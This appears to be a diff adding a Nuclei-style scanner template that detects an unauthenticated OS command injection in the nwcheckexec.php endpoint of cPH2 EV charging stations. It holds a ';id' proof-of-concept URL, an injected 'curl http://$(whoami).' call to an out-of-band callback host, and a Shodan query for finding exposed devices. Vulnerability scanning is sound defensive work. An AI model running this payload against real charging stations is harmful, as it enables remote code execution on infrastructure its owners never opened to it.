@@ -1,0 +1,37 @@
+id: salia-plcc-nwcheckexec-rce
+info:
+  name: cPH2 Charging Station nwcheckexec.php - OS Command Injection
+  author: mlec
+  severity: critical
+  description: |
+    An OS command injection vulnerability in Hardy Barth cPH2, may allow an unauthenticated remote attacker to execute arbitrary commands on the system via a specifically crafted arguments passed to the connectivity check feature.
+    poc: /nwcheckexec.php?type=ping&dest=8.8.8.8;id
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/Salia/Salia%20PLCC%20cPH2%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cvss-metrics: CVSS:3.1/AV:A/AC:N/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.6
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"Salia PLCC"
+  tags: cPH2-Charging-Station
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/nwcheckexec.php?ip={{url_encode(''127.0.0.1 && curl http://$(whoami).{{interactsh-url}}'')}}'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - <b>SUCCESS</b>
+          - 127.0.0.1 && curl http://$(whoami).{{interactsh-url}}
+        condition: and
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
